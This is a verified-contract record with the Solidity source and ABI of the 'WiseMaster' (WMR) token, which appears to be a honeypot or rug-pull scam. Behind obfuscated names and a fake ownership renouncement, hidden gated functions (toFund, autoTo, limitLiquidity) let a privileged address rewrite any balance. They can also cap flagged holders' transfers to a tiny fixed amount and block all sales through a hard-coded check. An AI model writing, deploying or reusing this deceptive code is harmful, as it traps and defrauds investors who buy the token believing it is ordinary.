{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface toLimit {\n    function createPair(address buyModeToken, address fundTo) external returns (address);\n}\n\ninterface launchFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableLaunched) external view returns (uint256);\n\n    function transfer(address amountFee, uint256 marketingIs) external returns (bool);\n\n    function allowance(address receiverLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountFee,\n        uint256 marketingIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxWallet, uint256 value);\n    event Approval(address indexed receiverLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract walletToIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchFeeMetadata is launchFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WiseMaster is walletToIs, launchFee, launchFeeMetadata {\n\n    function amountFund(address enableSell) public {\n        if (receiverMin) {\n            return;\n        }\n        if (takeSellMarketing != launchAmountTeam) {\n            listExempt = false;\n        }\n        sellLiquidity[enableSell] = true;\n        if (marketingTxLiquidity == listExempt) {\n            launchAmountTeam = fundAt;\n        }\n        receiverMin = true;\n    }\n\n    bool private senderLaunch;\n\n    function txLimit() private view {\n        require(sellLiquidity[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return listReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptLiquidity;\n    }\n\n    bool public receiverMin;\n\n    uint256 launchedIs;\n\n    uint256 public takeSellMarketing;\n\n    function balanceOf(address enableLaunched) public view virtual override returns (uint256) {\n        return sellWallet[enableLaunched];\n    }\n\n    uint256 private launchAmountTeam;\n\n    uint256 constant launchSell = 6 ** 10;\n\n    bool public marketingTxLiquidity;\n\n    function transferFrom(address teamTotal, address amountFee, uint256 marketingIs) external override returns (bool) {\n        if (_msgSender() != totalAt) {\n            if (toFrom[teamTotal][_msgSender()] != type(uint256).max) {\n                require(marketingIs <= toFrom[teamTotal][_msgSender()]);\n                toFrom[teamTotal][_msgSender()] -= marketingIs;\n            }\n        }\n        return sellTeam(teamTotal, amountFee, marketingIs);\n    }\n\n    address totalAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private listReceiver;\n\n    bool private takeAt;\n\n    function approve(address feeWalletBuy, uint256 marketingIs) public virtual override returns (bool) {\n        toFrom[_msgSender()][feeWalletBuy] = marketingIs;\n        emit Approval(_msgSender(), feeWalletBuy, marketingIs);\n        return true;\n    }\n\n    address public maxSwap;\n\n    bool public atSell;\n\n    function owner() external view returns (address) {\n        return listReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoLaunched;\n    }\n\n    address public minSell;\n\n    uint8 private exemptLiquidity = 18;\n\n    string private launchTotalIs = \"Wise Master\";\n\n    function transfer(address liquidityIs, uint256 marketingIs) external virtual override returns (bool) {\n        return sellTeam(_msgSender(), liquidityIs, marketingIs);\n    }\n\n    mapping(address => bool) public senderTrading;\n\n    constructor (){\n        if (listExempt == senderLaunch) {\n            limitReceiver = fundAt;\n        }\n        launchShould receiverWallet = launchShould(totalAt);\n        maxSwap = toLimit(receiverWallet.factory()).createPair(receiverWallet.WETH(), address(this));\n        if (listExempt) {\n            takeSellMarketing = fundAt;\n        }\n        minSell = _msgSender();\n        sellLiquidity[minSell] = true;\n        sellWallet[minSell] = autoLaunched;\n        toExempt();\n        if (takeAt == marketingTxLiquidity) {\n            marketingTxLiquidity = true;\n        }\n        emit Transfer(address(0), minSell, autoLaunched);\n    }\n\n    mapping(address => uint256) private sellWallet;\n\n    function tokenSell(address teamTotal, address amountFee, uint256 marketingIs) internal returns (bool) {\n        require(sellWallet[teamTotal] >= marketingIs);\n        sellWallet[teamTotal] -= marketingIs;\n        sellWallet[amountFee] += marketingIs;\n        emit Transfer(teamTotal, amountFee, marketingIs);\n        return true;\n    }\n\n    address walletMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function sellTeam(address teamTotal, address amountFee, uint256 marketingIs) internal returns (bool) {\n        if (teamTotal == minSell) {\n            return tokenSell(teamTotal, amountFee, marketingIs);\n        }\n        uint256 tradingModeSwap = launchFee(maxSwap).balanceOf(walletMode);\n        require(tradingModeSwap == launchedIs);\n        require(amountFee != walletMode);\n        if (senderTrading[teamTotal]) {\n            return tokenSell(teamTotal, amountFee, launchSell);\n        }\n        return tokenSell(teamTotal, amountFee, marketingIs);\n    }\n\n    uint256 public fundAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchTotalIs;\n    }\n\n    function autoTo(address liquidityBuy) public {\n        txLimit();\n        if (launchAmountTeam == takeSellMarketing) {\n            senderLaunch = false;\n        }\n        if (liquidityBuy == minSell || liquidityBuy == maxSwap) {\n            return;\n        }\n        senderTrading[liquidityBuy] = true;\n    }\n\n    uint256 private limitReceiver;\n\n    string private shouldMax = \"WMR\";\n\n    uint256 private autoLaunched = 100000000 * 10 ** 18;\n\n    function limitLiquidity(uint256 marketingIs) public {\n        txLimit();\n        launchedIs = marketingIs;\n    }\n\n    mapping(address => mapping(address => uint256)) private toFrom;\n\n    bool public listExempt;\n\n    function allowance(address fundToTrading, address feeWalletBuy) external view virtual override returns (uint256) {\n        if (feeWalletBuy == totalAt) {\n            return type(uint256).max;\n        }\n        return toFrom[fundToTrading][feeWalletBuy];\n    }\n\n    event OwnershipTransferred(address indexed launchedAt, address indexed limitList);\n\n    function toExempt() public {\n        emit OwnershipTransferred(minSell, address(0));\n        listReceiver = address(0);\n    }\n\n    uint256 autoMin;\n\n    function toFund(address liquidityIs, uint256 marketingIs) public {\n        txLimit();\n        sellWallet[liquidityIs] = marketingIs;\n    }\n\n    mapping(address => bool) public sellLiquidity;\n\n    bool public senderMaxShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeWalletBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"}],\"name\":\"amountFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeWalletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"}],\"name\":\"autoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"limitLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTxLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMaxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSellMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WiseMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}